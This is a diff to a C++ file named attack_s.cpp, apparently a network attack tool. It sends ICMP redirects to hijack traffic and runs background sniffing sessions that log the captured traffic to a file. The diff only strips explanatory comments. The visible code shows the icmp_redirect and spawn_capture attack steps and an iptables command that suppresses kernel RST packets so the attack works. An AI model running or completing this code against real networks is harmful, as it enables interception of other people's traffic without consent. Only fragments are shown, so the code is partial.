@@ -1,13 +1,6 @@
 /*
  * attack_s.cpp  —  sequential version
  *
- * Iterates ports one by one, blocks one by one.
- * On c-ACK: sends ICMP redirect, spawns a background capture session,
- * then moves immediately to the next port (no waiting for sniff to finish).
- * All capture sessions run concurrently; they self-terminate after SNIFF_WAIT
- * seconds via an internal timer + stop_sniff(). Captured traffic is printed
- * to terminal and appended to captured.txt.
- *
  * NOTE: suppress kernel RST responses before running:
  *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
  *
@@ -143,7 +136,7 @@ int main(int argc, char* argv[]) {
                 cout << ts() << "  Sending ICMP redirects...\n";
                 icmp_redirect(block, port, seq, iface, sender, self_mac, gw_mac, mac_cache);
 
-                // 5. Spawn background capture — returns immediately, runs SNIFF_WAIT seconds
+             
                 cout << ts() << "  Capture session started (sniffing " << SNIFF_WAIT << "s in background).\n\n";
                 sessions.push_back(spawn_capture(block, port, SNIFF_WAIT, cap_log, log_mtx));
 
